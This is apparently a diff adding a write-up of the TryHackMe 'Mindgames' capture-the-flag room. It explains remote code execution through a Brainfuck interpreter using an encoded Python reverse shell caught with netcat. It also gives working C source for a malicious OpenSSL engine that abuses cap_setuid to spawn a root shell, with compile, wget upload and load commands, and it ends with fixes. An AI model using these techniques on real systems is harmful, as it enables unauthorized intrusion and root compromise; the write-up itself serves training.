@@ -1,0 +1,130 @@
+---
+title: 'Mindgames'
+description: 'A public Brainfuck interpreter runs attacker-supplied code, so an esolang-encoded Python reverse shell lands a foothold; then openssl carrying the cap_setuid capability is abused with a malicious engine to spawn a root shell.'
+date: 2026-02-25
+platform: tryhackme
+room: 'Mindgames'
+roomUrl: 'https://tryhackme.com/room/mindgames'
+difficulty: medium
+tags:
+  - 'web'
+  - 'rce'
+  - 'linux'
+  - 'privesc'
+vulnClasses:
+  - 'insecure command execution'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Mindgames" room from TryHackMe. The whole box is a mind game: a web page proudly runs code written in an esoteric language, which is really an arbitrary-code-execution engine in disguise. We encode a Python reverse shell into Brainfuck to get a foothold, then abuse an_ _`openssl`_ _binary that was granted the_ _`cap_setuid`_ _capability to walk straight to root._
+
+> Mindgames is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. Both flags are shown as `THM{<redacted>}` — real on the box, withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Port 80 serves a page that “runs” Brainfuck → it actually transpiles and executes arbitrary code, so encode a **Python reverse shell** into Brainfuck and submit it for **RCE as** **`mindgames`** (user flag) → enumerate SUID/capabilities and find `/usr/bin/openssl` carries **`cap_setuid+ep`** → compile a malicious OpenSSL **engine** whose constructor calls `setuid(0)` and spawns a shell → load it with `openssl req -engine ./engine.so` for a **root** shell (root flag).
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` shows SSH and a Go web server:
+
+```text
+22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu
+80/tcp open  http  Golang net/http server   # "Mindgames."
+```
+
+The page presents a code box that executes **Brainfuck**, with friendly “Hello, world” and Fibonacci samples to show it genuinely runs programs. Directory brute-forcing turns up nothing — the interpreter _is_ the attack surface.
+
+### **The vulnerability**
+
+The site's gimmick is that it runs code you submit. An esoteric language is still a Turing-complete language: if the server will execute arbitrary Brainfuck, it will execute whatever that Brainfuck transpiles to. This is **arbitrary code execution by design**, dressed up as a toy.
+
+<Callout type="insight">
+
+The samples prove the engine maps Brainfuck to real Python-level behaviour (printing, loops). So the exploit is just a translation problem: write a normal Python reverse shell, **encode it into Brainfuck**, and submit it. The “obscure language” is not a security boundary — running untrusted code is running untrusted code, whatever the syntax.
+
+</Callout>
+
+### **Step 1 — Brainfuck-encoded reverse shell → foothold (user flag)**
+
+Write a Python reverse shell, encode it to Brainfuck (any Python→BF encoder works), and paste it into the run box. A trimmed-down payload avoids the interpreter choking on size:
+
+```text
+# attacker
+nc -lnvp 4444
+# paste the Brainfuck-encoded python reverse shell into the web run box
+```
+
+```text
+# caught
+$ whoami
+mindgames
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+mindgames@mindgames:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Step 2 — abuse openssl's cap_setuid capability → root (root flag)**
+
+A SUID sweep and a `linpeas` run highlight the real issue in the **Capabilities** section: `/usr/bin/openssl` was granted `cap_setuid+ep`. Linux capabilities aren't in GTFOBins the way a plain SUID is — the clean route is a malicious OpenSSL **engine** (a shared object OpenSSL will `dlopen`). Its constructor runs on load, so we call `setuid(0)` and exec a shell:
+
+```text
+// engine.c
+#include <unistd.h>
+__attribute__((constructor))
+static void init(){
+    setuid(0);
+    execl("/bin/sh", "sh", NULL);
+}
+```
+
+Compile it against libcrypto, upload, and load it through openssl:
+
+```text
+gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -lcrypto a.o
+# upload engine.so to the target (python3 -m http.server + wget), then:
+mindgames@mindgames:/tmp$ /usr/bin/openssl req -engine ./engine.so
+# whoami -> root
+# cat /root/root.txt -> THM{<redacted>}
+```
+
+Because openssl keeps `cap_setuid`, the `setuid(0)` in our engine succeeds and the shell it spawns is root.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). The web service executes arbitrary attacker-supplied code with no sandbox, giving unauthenticated remote code execution as the service account. A dangerous capability (`cap_setuid`) on `openssl` then allows trivial escalation to root via a loadable engine — full compromise of the host.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Never execute untrusted code server-side.** If a code runner is a product requirement, isolate it hard (container/jail, seccomp, no outbound network, strict CPU/memory/time limits, dropped privileges).
+- **Don't grant** **`cap_setuid`** **to general-purpose binaries.** `openssl` with `cap_setuid+ep` is equivalent to a root shell; audit file capabilities (`getcap -r /`) and remove anything unnecessary.
+- **Run the web service as an unprivileged, confined user** so a foothold has nowhere obvious to go.
+
+</Callout>
+
+### **Takeaways**
+
+- **An “obscure” language is not a security control.** If the server runs your Brainfuck, it runs your reverse shell.
+- **Capabilities are the quiet cousin of SUID.** `getcap -r /` belongs in every privesc checklist; `cap_setuid` on a flexible binary like openssl is game over.
+- **OpenSSL engines are a clean capability-abuse primitive** — a constructor in a loaded `.so` runs with whatever privilege the loader holds.
+
+Mindgames lives up to its name: the trick is realising the “puzzle” is just plain code execution wearing a costume. Thanks for reading.
